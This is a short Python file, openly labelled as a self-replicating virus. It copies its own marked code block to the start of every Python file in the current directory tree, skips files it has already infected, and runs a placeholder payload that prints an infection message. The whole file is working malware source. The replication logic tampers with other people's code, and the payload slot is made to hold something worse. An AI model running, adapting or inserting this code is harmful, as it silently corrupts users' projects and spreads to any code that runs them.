'''Self-Replicating script that adds (Self-replicating code + Payload) to the beginning of all python files in current directory and all subdirectories.'''
#Start of virus
import sys, glob

with open(sys.argv[0],'r') as f:
    current_file=f.readlines()

viral_code=[]
virus_area=False
for line in current_file:
    if line=='#Start of virus\n':
        virus_area=True
    if virus_area:
        viral_code.append(line)
    if line=='#End of virus':
        break

a=glob.glob('**/*.py', recursive=True)
for file in a:
    with open(file, 'r') as f:
        contents=f.readlines()
    
    infected=False
    for line in contents:
        if line=='#Start of virus\n':
            infected=True
            break
    
    if not infected:
        final_contents=[]
        final_contents.extend(viral_code)
        final_contents.extend('\n')
        final_contents.extend(contents)
        with open(file, 'w') as f:
            f.writelines(final_contents)

#Payload here
print('This file is infected!')  

#End of virus